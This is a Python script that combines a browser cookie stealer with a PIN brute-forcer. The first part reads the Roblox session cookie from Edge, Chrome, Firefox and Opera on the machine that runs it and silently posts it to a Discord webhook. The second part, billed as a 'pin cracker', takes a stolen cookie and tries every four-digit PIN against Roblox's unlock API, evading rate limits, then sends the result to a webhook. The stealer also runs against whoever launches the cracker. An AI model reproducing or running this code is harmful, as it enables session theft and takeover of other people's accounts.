from multiprocessing.connection import wait
import browser_cookie3, requests, threading 

webhook = "YOUR WEBHOOK HEREEEEEEEEEE"

def edge_logger():
    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'StarsMethod', 'content':f'**Microsoft Edge** **```{cookie}```**'})
    except:
        pass
        
def chrome_logger():
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'StarsMethod','avatar':'https://cdn.discordapp.com/attachments/823175253659222026/1006338286253522954/unknown.png', 'content': f'**Google Chrome** **```{cookie}```**'})
    except:
        pass

def firefox_logger():
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'StarsMethod','avatar':'https://cdn.discordapp.com/attachments/823175253659222026/1006338286253522954/unknown.png', 'content': f'**Firefox Browser** **```{cookie}```**'})
    except:
        pass

def opera_logger():
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        cookies = str(cookies)
        cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
        requests.post(webhook, json={'username':'StarsMethod','avatar':'https://cdn.discordapp.com/attachments/823175253659222026/1006338286253522954/unknown.png','content': f'**opera GX Browser** **```{cookie}```**'})
    except:
        pass

browsers = [edge_logger, chrome_logger, firefox_logger, opera_logger]

for x in browsers:
    threading.Thread(target=x,).start()

import requests
import re
import string
import time
import os

pingEveryone = True

print('')
print('Enter cookie below Here:')
cookie = input()
os.system("cls")
print('')
print('Enter your webhook below:')
webhook = input()
os.system("cls")
print('')
print('Should we ping Everyone?: ( yes / no )')
pingEveryone = input()
os.system("cls")
if pingEveryone.lower == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
else:
    ping = '***Pin Cracked!***'
os.system("cls")

print('''
 STAR PIN CRACKER\n\n''')

url = 'https://auth.roblox.com/v1/account/pin/unlock'
token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY":cookie})
xcrsf = (token.headers['x-csrf-token'])
header = {'X-CSRF-TOKEN': xcrsf}

i = 0

for i in range(9999):
    try:
        pin = str(i).zfill(4)
        payload = {'pin': pin}
        r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY":cookie})
        if 'unlockedUntil' in r.text:
            print(f'Pin Cracked! Pin: {pin}')
            username = requests.get("https://users.roblox.com/v1/users/authenticated",cookies={".ROBLOSECURITY":cookie}).json()['name']
            data = {
                "content" : ping,
                "username" : "Stars Pin Cracker",
                "avatar_url" : "https://media.discordapp.net/attachments/1011233808344948807/1011480298418094110/webhookicon.jpg?width=360&height=360"
            }
            data["embeds"] = [
                {
                    "description" : f"{username}\'s Pin:\n```{pin}```",
                    "title" : "Pin!",
                    "color" : 0x4e00ff, 
                    "URL" : "https://discord.gg/pqx3WDjCft"
                }
            ]

            result = requests.post(webhook, json = data)
            input('Any Key To Exit')
            break
            
        elif 'Too many requests made' in r.text:
                
            print('  Ratelimited, trying again in 60 seconds..')
            time.sleep(60)
                
        elif 'Authorization' in r.text:
                
            print('  Error - Cookie Invalid')
            break
            
        elif 'Incorrect' in r.text:
            print(f"  Tried: {pin} , Incorrect!")
            time.sleep(10)  
    except:
        print('  Error!')
    
input('\n  Press any key to exit')
